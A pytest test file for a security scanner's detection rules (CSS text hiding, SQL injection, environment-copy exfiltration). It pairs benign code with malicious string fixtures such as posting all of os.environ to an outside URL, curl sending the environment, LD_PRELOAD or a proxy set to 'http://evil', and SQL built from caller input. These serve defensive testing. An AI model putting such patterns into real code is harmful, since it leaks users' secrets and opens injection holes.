"""Second round of false-positive hardening, found by scanning Token Optimizer
and Outsourcerer. Every benign shape is paired with a malicious twin that must
still be reported."""
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'scripts'))

import scan_runtime_dynamism  # noqa: E402
import scan_sast  # noqa: E402


def _write(tmp_path, rel, text):
    path = tmp_path / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding='utf-8')
    return str(path), rel


# --- CSS opacity:0 inside @keyframes -------------------------------------

def _opacity_lines(tmp_path, name, body):
    p, r = _write(tmp_path, name, body)
    return [f.line for f in scan_sast.scan_css_steganography(p, r) if f.title == "CSS hiding: opacity:0"]


def _svg(style, extra=''):
    return f'<svg xmlns="http://www.w3.org/2000/svg">\n<style>\n{style}\n</style>\n{extra}<text class="t">hi</text>\n</svg>\n'


LOOP = ('.t { animation: fade 8s ease-in-out infinite; }\n'
        '@keyframes fade { 0%, 100% { opacity: 0; } 20%, 80% { opacity: 1; } }')


def test_looping_fade_keyframes_are_not_hiding(tmp_path):
    assert _opacity_lines(tmp_path, 'a.svg', _svg(LOOP)) == []


def test_fade_in_once_and_stay_is_not_hiding(tmp_path):
    style = ('.t { animation: rise 600ms ease 1 both; animation-delay: 300ms; }\n'
             '@keyframes rise { from { opacity: 0; } to { opacity: 1; } }')
    assert _opacity_lines(tmp_path, 'a.svg', _svg(style)) == []


def test_keyframes_that_end_hidden_still_reported(tmp_path):
    style = ('.t { animation: gone 2s forwards; }\n'
             '@keyframes gone { from { opacity: 1; } to { opacity: 0; } }')
    assert _opacity_lines(tmp_path, 'a.svg', _svg(style)) != []


def test_reversed_hold_still_reported(tmp_path):
    style = ('.t { animation: rise 2s reverse forwards; }\n'
             '@keyframes rise { from { opacity: 0; } to { opacity: 1; } }')
    assert _opacity_lines(tmp_path, 'a.svg', _svg(style)) != []


def test_infinite_with_held_frame_still_reported(tmp_path):
    style = ('.t { animation: gone 2s infinite; } .u { animation-fill-mode: forwards; }\n'
             '@keyframes gone { 0% { opacity: 1; } 100% { opacity: 0; } }')
    assert _opacity_lines(tmp_path, 'a.svg', _svg(style)) != []


def test_paused_animation_still_reported(tmp_path):
    style = ('.t { animation: fade 8s infinite; animation-play-state: paused; }\n'
             '@keyframes fade { 0%, 100% { opacity: 0; } 20%, 80% { opacity: 1; } }')
    assert _opacity_lines(tmp_path, 'a.svg', _svg(style)) != []


def test_huge_duration_still_reported(tmp_path):
    style = ('.t { animation: fade 99999999s infinite; }\n'
             '@keyframes fade { 0%, 100% { opacity: 0; } 20%, 80% { opacity: 1; } }')
    assert _opacity_lines(tmp_path, 'a.svg', _svg(style)) != []


def test_huge_delay_with_backwards_fill_still_reported(tmp_path):
    style = ('.t { animation: fade 2s 99999s both; }\n'
             '@keyframes fade { from { opacity: 0; } to { opacity: 1; } }')
    assert _opacity_lines(tmp_path, 'a.svg', _svg(style)) != []


def test_all_hidden_cycle_still_reported(tmp_path):
    style = ('.t { animation: fade 8s infinite; }\n'
             '@keyframes fade { 0% { opacity: 0; } 100% { opacity: 0; } }')
    assert _opacity_lines(tmp_path, 'a.svg', _svg(style)) != []


def test_variable_duration_timeline_and_scripts_still_reported(tmp_path):
    for style, extra in [
        ('.t { animation: fade var(--d) infinite; }\n@keyframes fade { 0%,100% { opacity: 0; } 20%,80% { opacity: 1; } }', ''),
        (LOOP + '\n.t { animation-timeline: scroll(); }', ''),
        (LOOP, '<script>document.querySelector(".t").style.animationPlayState="paused"</script>\n'),
        ('@import url(x.css);\n' + LOOP, ''),
    ]:
        assert _opacity_lines(tmp_path, 'a.svg', _svg(style, extra)) != []


def test_escaped_property_name_still_reported(tmp_path):
    style = LOOP + '\n.u { animation-fill-\\6d ode: forwards; }'
    assert _opacity_lines(tmp_path, 'a.svg', _svg(style)) != []


def test_base_opacity_zero_and_inline_style_still_reported(tmp_path):
    body = _svg(LOOP + '\n.secret { opacity: 0; }', '<text style="opacity:0;">x</text>\n')
    assert len(_opacity_lines(tmp_path, 'a.svg', body)) == 2


def test_keyframes_in_html_and_unused_keyframes_still_reported(tmp_path):
    assert _opacity_lines(tmp_path, 'a.html', _svg(LOOP)) != []
    assert _opacity_lines(tmp_path, 'b.svg', _svg('@keyframes fade { 0%,100% { opacity: 0; } 20%,80% { opacity: 1; } }')) != []


def test_one_line_minified_base_rule_next_to_keyframes_still_reported(tmp_path):
    style = '.s{opacity:0} .t{animation:fade 8s infinite} @keyframes fade{0%,100%{opacity:0}20%,80%{opacity:1}}'
    assert _opacity_lines(tmp_path, 'a.svg', _svg(style)) != []


def test_duplicate_keyframes_name_still_reported(tmp_path):
    style = LOOP + '\n@keyframes fade { 0% { opacity: 0; } 100% { opacity: 0; } }'
    assert _opacity_lines(tmp_path, 'a.svg', _svg(style)) != []


def test_other_hiding_on_the_same_line_is_still_reported(tmp_path):
    style = ('.t { animation: fade 8s infinite; }\n'
             '@keyframes fade { 0%, 100% { opacity: 0; font-size: 0; } 20%, 80% { opacity: 1; } }')
    p, r = _write(tmp_path, 'a.svg', _svg(style))
    titles = [f.title for f in scan_sast.scan_css_steganography(p, r)]
    assert "CSS hiding: zero-size text" in titles
    assert "CSS hiding: opacity:0" not in titles


# --- SA-PY-008 static SQL text -------------------------------------------

def _sql(tmp_path, body):
    p, r = _write(tmp_path, 'db.py', body)
    return sorted(f.line for f in scan_sast.scan_file(p, r) if f.rule_id == 'SA-PY-008')


def test_static_sql_text_is_not_injection(tmp_path):
    body = (
        'import sqlite3\n'
        'LIMIT_MS = 5000\n'
        'def a(conn, ms):\n'
        '    conn.execute(f"PRAGMA busy_timeout={int(ms)}")\n'
        '    conn.execute(f"PRAGMA busy_timeout={LIMIT_MS}")\n'
        '    for col in ("a", "b"):\n'
        '        conn.execute(f"ALTER TABLE t ADD COLUMN {col} TEXT")\n'
        '    where = "WHERE d >= ?"\n'
        '    where += " AND s = ?"\n'
        '    conn.execute(f"SELECT 1 FROM t {where}", [1])\n'
        '    conn.execute("SELECT %s", (1,))\n'
    )
    assert _sql(tmp_path, body) == []


def test_caller_controlled_sql_text_still_reported(tmp_path):
    body = (
        'def param(conn, table):\n'
        '    conn.execute(f"SELECT * FROM {table}")\n'            # 2
        'def concat(conn, q):\n'
        '    conn.execute("SELECT * FROM t WHERE " + q)\n'          # 4
        'def pct(conn, v):\n'
        '    conn.execute("SELECT %s" % v)\n'                       # 6
        'def fmt(conn, v):\n'
        '    conn.execute("SELECT {}".format(v))\n'                 # 8
        'def cast_str(conn, v):\n'
        '    conn.execute(f"SELECT {str(v)}")\n'                    # 10
        'def attr(conn, o):\n'
        '    conn.execute(f"SELECT {o.name}")\n'                    # 12
        'def loop_param(conn, cols):\n'
        '    for c in cols:\n'
        '        conn.execute(f"SELECT {c}")\n'                     # 15
        'def rebound(conn, v):\n'
        '    col = "a"\n'
        '    col = v\n'
        '    conn.execute(f"SELECT {col}")\n'                       # 19
    )
    assert _sql(tmp_path, body) == [2, 4, 6, 8, 10, 12, 15, 19]


def test_rebinding_tricks_still_reported(tmp_path):
    body = (
        'from cfg import TABLE\n'
        'def imported(conn):\n'
        '    conn.execute(f"SELECT * FROM {TABLE}")\n'              # 3
        'NAME = "a"\n'
        'def glob(conn):\n'
        '    global NAME\n'
        '    NAME = input()\n'
        '    conn.execute(f"SELECT * FROM {NAME}")\n'               # 8
        'def shadow(conn, v):\n'
        '    int = str\n'
        '    conn.execute(f"SELECT {int(v)}")\n'                    # 11
        'def mutable(conn, v):\n'
        '    cols = ["a"]\n'
        '    cols.append(v)\n'
        '    for c in cols:\n'
        '        conn.execute(f"SELECT {c}")\n'                     # 16
        'def evalbind(conn, v):\n'
        '    col = "a"\n'
        '    exec("col = v")\n'
        '    conn.execute(f"SELECT {col}")\n'                       # 20
    )
    assert _sql(tmp_path, body) == [3, 8, 11, 16, 20]


def test_module_name_rebound_through_globals_still_reported(tmp_path):
    body = (
        'T = "a"\n'
        'globals()["T"] = input()\n'
        'def f(conn):\n'
        '    conn.execute(f"SELECT * FROM {T}")\n'
    )
    assert _sql(tmp_path, body) == [4]


def test_one_static_one_dynamic_call_on_a_line_is_reported(tmp_path):
    body = 'def f(c, q):\n    c.execute("SELECT 1"); c.execute("SELECT " + q)\n'
    assert _sql(tmp_path, body) == [2]


# --- RD-TB-007 --------------------------------------------------------------

def _tb(tmp_path, body, name='t.py'):
    p, r = _write(tmp_path, name, body)
    return sorted(f.line for f in scan_runtime_dynamism.scan_file(p, r) if f.rule_id == 'RD-TB-007')


def test_keyword_argument_is_not_a_counter_threshold(tmp_path):
    assert _tb(tmp_path, 'seed(heavy_calls=40,\n     light_calls=10)\nmax_attempts = 25\n') == []


def test_comparisons_and_branches_still_reported(tmp_path):
    body = (
        'if count > 50:\n    pass\n'                      # 1
        'while attempts >= 10:\n    pass\n'               # 3
        'if (calls == 99): pass\n'                        # 5
        'x = count = 50 if flag else 0\n'                 # 6 (branch context)
        'ok = [c for c in rows if counter = 77]\n'        # 7 (branch context)
    )
    assert _tb(tmp_path, body) == [1, 3, 5, 6, 7]


def test_shell_and_sql_single_equals_tests_still_reported(tmp_path):
    assert _tb(tmp_path, 'if [ $count = 50 ]; then run; fi\n', 't.sh') == [1]
    assert _tb(tmp_path, 'q = "SELECT * FROM t WHERE calls = 100"\n') == [1]


def test_fstring_without_a_field_is_static_but_one_with_a_field_is_not(tmp_path):
    assert _sql(tmp_path, "def f(c):\n    c.execute(f'x')\n") == []
    assert _sql(tmp_path, "def f(c, v):\n    c.execute(f'x{v}')\n") == [2]


# --- ST-EX-005 / ST-EX-007: environment copy kept as a child environment --------

def _envcopy(tmp_path, body):
    import scan_skill_threats
    p, r = _write(tmp_path, 'harness.py', body)
    return sorted(f.line for f in scan_skill_threats.scan_file(p, r) if f.rule_id in ('ST-EX-005', 'ST-EX-007'))


def test_environment_copy_that_only_becomes_child_env_is_not_reported(tmp_path):
    body = (
        'import os, subprocess\n'
        'subprocess.run(["x"], env=dict(os.environ))\n'
        'env = os.environ.copy()\n'
        'env["A"] = "1"\n'
        'env.pop("B", None)\n'
        'env.update(C="3")\n'
        'subprocess.run(["x"], env=env)\n'
        'e2 = {k: v for k, v in os.environ.items() if not k.startswith("SECRET")}\n'
        'subprocess.Popen(["y"], env=e2)\n'
    )
    assert _envcopy(tmp_path, body) == []


def test_environment_copy_that_leaves_the_process_is_still_reported(tmp_path):
    body = (
        'import os, subprocess, requests, json\n'
        'a = dict(os.environ)\n'                                         # 2
        'requests.post("http://x", json=a)\n'
        'b = os.environ.copy()\n'                                        # 4
        'subprocess.run(["x"], env=b)\n'
        'open("f", "w").write(json.dumps(b))\n'
        'c = os.environ.copy()\n'                                        # 7
        'd = c\n'
        'subprocess.run(["x"], env=d)\n'
        'def f():\n'
        '    return dict(os.environ)\n'                                  # 11
        'g = {k: requests.post("http://x", data=v) for k, v in os.environ.items()}\n'  # 12
        'class K:\n'
        '    def __init__(self):\n'
        '        self.env = os.environ.copy()\n'                         # 15
        'subprocess.run(["curl", "-d", str(dict(os.environ))])\n'         # 16
        'h = os.environ.copy()\n'                                        # 17
        'subprocess.run(["x"], env=h)\n'
        'send(h)\n'
    )
    assert _envcopy(tmp_path, body) == [2, 4, 7, 11, 12, 15, 16, 17]


def test_environment_copy_leaked_from_a_nested_function_is_still_reported(tmp_path):
    body = (
        'import os, subprocess, requests\n'
        'def f():\n'
        '    env = os.environ.copy()\n'                                  # 3
        '    subprocess.run(["x"], env=env)\n'
        '    def leak():\n'
        '        requests.post("http://x", json=env)\n'
        '    leak()\n'
    )
    assert _envcopy(tmp_path, body) == [3]


def test_steering_or_nonliteral_edits_keep_the_environment_copy_visible(tmp_path):
    body = (
        'import os, subprocess\n'
        'a = dict(os.environ)\n'                                         # 2
        'a["PATH"] = "/tmp/x"\n'
        'subprocess.run(["x"], env=a)\n'
        'b = os.environ.copy()\n'                                        # 5
        'b.update(LD_PRELOAD="/tmp/x.so")\n'
        'subprocess.run(["x"], env=b)\n'
        'c = os.environ.copy()\n'                                        # 8
        'c.update({"HTTPS_PROXY": "http://evil"})\n'
        'subprocess.run(["x"], env=c)\n'
        'd = os.environ.copy()\n'                                        # 11
        'd[key] = "1"\n'
        'subprocess.run(["x"], env=d)\n'
        'e = os.environ.copy()\n'                                        # 14
        'e["PYTHONPATH"] = "/tmp/x"\n'
        'subprocess.run(["x"], env=e)\n'
        'f = os.environ.copy()\n'                                        # 17
        'f["HTTP_PROXY"] = "x"\n'
        'subprocess.run(["x"], env=f)\n'
        'g = os.environ.copy()\n'                                        # 20
        'g.update(other)\n'
        'subprocess.run(["x"], env=g)\n'
    )
    assert _envcopy(tmp_path, body) == [2, 5, 8, 11, 14, 17, 20]


def test_removing_a_steering_key_is_not_a_reason_to_report(tmp_path):
    body = (
        'import os, subprocess\n'
        'a = os.environ.copy()\n'
        'a.pop("PYTHONPATH", None)\n'
        'subprocess.run(["x"], env=a)\n'
    )
    assert _envcopy(tmp_path, body) == []


def test_dict_literal_spreading_the_environment_keeps_steering_keys_visible(tmp_path):
    body = (
        'import os, subprocess\n'
        'subprocess.run(["x"], env={**os.environ.copy(), "PATH": "/tmp/x"})\n'      # 2
        'subprocess.run(["x"], env={**os.environ.copy(), "FOO": "1"})\n'            # 3
        'subprocess.run(["x"], env={**os.environ.copy(), key: "1"})\n'              # 4
    )
    assert _envcopy(tmp_path, body) == [2, 4]
